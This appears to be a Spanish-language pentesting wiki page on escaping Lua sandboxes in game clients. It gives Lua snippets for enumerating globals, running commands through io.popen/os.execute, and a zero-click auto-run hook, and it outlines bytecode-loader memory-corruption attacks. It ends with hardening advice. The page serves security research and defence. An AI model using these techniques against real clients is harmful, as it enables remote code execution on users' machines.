# Bypass de sandboxes Lua (VM embebidas, game clients)

Esta página recopila técnicas prácticas para enumerar y escapar de "sandboxes" de Lua integradas en aplicaciones (especialmente game clients, plugins o motores de scripting dentro de aplicaciones). Muchos motores exponen un entorno Lua restringido, pero dejan accesibles globals potentes que permiten la ejecución arbitraria de comandos o incluso la corrupción de memoria nativa cuando los bytecode loaders están expuestos.

Ideas clave:
- Trata la VM como un entorno desconocido: enumera _G y descubre qué primitivas peligrosas son accesibles.
- Cuando stdout/print está bloqueado, abusa de cualquier canal de UI/IPC dentro de la VM como output sink para observar los resultados.
- Si io/os está expuesto, normalmente tienes ejecución directa de comandos (io.popen, os.execute).
- Si load/loadstring/loadfile está expuesto, ejecutar Lua bytecode manipulado puede eludir la memory safety en algunas versiones (los verifiers de ≤5.1 pueden eludirse; 5.2 eliminó el verifier), lo que permite una explotación avanzada.

## Enumerar el entorno sandboxed

- Descarga el entorno global para inventariar las tablas/funciones accesibles:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Si no hay disponible `print()`, reutiliza los canales dentro de la VM. Ejemplo de una VM de script de housing de un MMO en la que la salida del chat solo funciona después de una llamada de sonido; lo siguiente crea una función de salida fiable:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generaliza este patrón para tu objetivo: cualquier textbox, toast, logger o UI callback que acepte strings puede actuar como stdout para el reconocimiento.

## Ejecución directa de comandos si io/os está expuesto

Si el sandbox aún expone las bibliotecas estándar io u os, probablemente tengas ejecución inmediata de comandos:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notas:

- La ejecución ocurre dentro del proceso del cliente; muchas capas anti-cheat/antidebug que bloquean debuggers externos no impedirán la creación de procesos dentro de la VM.
- Comprueba también: package.loadlib (carga arbitraria de DLL/.so), require con módulos nativos, ffi de LuaJIT (si está presente) y la biblioteca debug (puede elevar privilegios dentro de la VM).

## Triggers zero-click mediante callbacks auto-run

Si la aplicación host envía scripts a los clientes y la VM expone hooks auto-run (por ejemplo, OnInit/OnLoad/OnEnter), coloca ahí tu payload para lograr un compromiso drive-by en cuanto se cargue el script:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Cualquier callback equivalente (OnLoad, OnEnter, etc.) generaliza esta técnica cuando los scripts se transmiten y ejecutan automáticamente en el cliente.

## Primitivas peligrosas que se deben buscar durante el recon

Durante la enumeración de _G, busca específicamente:
- io, os: io.popen, os.execute, file I/O, acceso a env.
- load, loadstring, loadfile, dofile: ejecutan source o bytecode; permiten cargar bytecode no confiable.
- package, package.loadlib, require: carga de dynamic libraries y superficie de módulos.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo y hooks.
- Solo en LuaJIT: ffi.cdef, ffi.load para llamar directamente a native code.

Ejemplos mínimos de uso (si son accesibles):

La API de carga de Lua cambió entre versiones: en Lua 5.1, `load` lee desde una función reader y `loadstring` lee desde un string; el `load` de Lua 5.2 acepta un string o una función reader, y `loadstring` está deprecated como su equivalente.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalada opcional: abusar de los cargadores de bytecode de Lua

Cuando load/loadstring/loadfile son accesibles, pero io/os están restringidos, la ejecución de bytecode de Lua manipulado puede permitir la divulgación y corrupción de memoria. Datos clave:
- Lua ≤ 5.1 incluía un verificador de bytecode que tiene bypasses conocidos.<sup>[[4]](#references)</sup>
- Lua 5.2 eliminó completamente el verificador (postura oficial: las aplicaciones simplemente deberían rechazar los chunks precompilados), ampliando la superficie de ataque si no se prohíbe la carga de bytecode.<sup>[[2]](#references)[[3]](#references)</sup>
- Los workflows suelen consistir en: filtrar pointers mediante output dentro de la VM, manipular bytecode para crear confusiones de tipos (por ejemplo, alrededor de FORLOOP u otros opcodes) y después pivotar a lectura/escritura arbitraria o ejecución de código nativo.<sup>[[2]](#references)[[4]](#references)</sup>

Este camino depende del engine y de la versión, y requiere RE. Consulta las referencias para obtener análisis detallados, primitives de explotación y ejemplos de gadgetry en games.

## Notas de detección y hardening (para defenders)

- Lado del servidor: rechazar o reescribir los scripts de usuario; permitir únicamente APIs seguras mediante allowlist; eliminar o dejar vinculados a valores vacíos io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Lado del cliente: ejecutar Lua con un _ENV mínimo, prohibir la carga de bytecode, reintroducir un verificador estricto de bytecode o comprobaciones de firmas, y bloquear la creación de procesos desde el proceso del cliente.
- Telemetría: generar alertas ante la creación de procesos secundarios por parte de gameclient poco después de la carga de un script; correlacionarla con eventos de UI/chat/script.

## References

- [1] [Esta casa está encantada: un RCE de hace una década en el cliente de AION (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Desglose del bytecode: desentrañando las fallas de seguridad de Lua en Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): debate sobre la eliminación del verificador de bytecode](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Explotación del bytecode de Lua 5.1 (gist con bypasses/notas del verificador)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Manual de referencia de Lua 5.1](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Manual de referencia de Lua 5.2](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
